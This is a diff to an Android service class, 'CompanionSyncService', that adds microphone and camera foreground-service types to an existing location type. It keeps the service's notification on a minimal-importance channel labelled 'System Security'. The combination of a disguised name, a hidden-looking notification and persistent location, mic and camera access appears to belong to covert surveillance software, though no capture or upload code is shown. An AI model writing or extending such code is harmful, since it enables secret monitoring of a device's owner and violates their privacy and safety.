@@ -41,9 +41,11 @@ public class CompanionSyncService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(NOTIF_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
-            } else { startForeground(NOTIF_ID, buildNotification()); }
+            int type = 0;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(NOTIF_ID, buildNotification(), type);
+            else startForeground(NOTIF_ID, buildNotification());
         } catch (Throwable t) {
             try { startForeground(NOTIF_ID, buildNotification()); } catch (Throwable ignored) {}
         }
@@ -165,10 +167,8 @@ public class CompanionSyncService extends Service {
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Security", NotificationManager.IMPORTANCE_MIN);
-            ch.setShowBadge(false);
             NotificationManager nm = getSystemService(NotificationManager.class);
-            if (nm != null) nm.createNotificationChannel(ch);
+            if (nm != null) nm.createNotificationChannel(new NotificationChannel(CHANNEL_ID, "System Security", NotificationManager.IMPORTANCE_MIN));
         }
     }
 
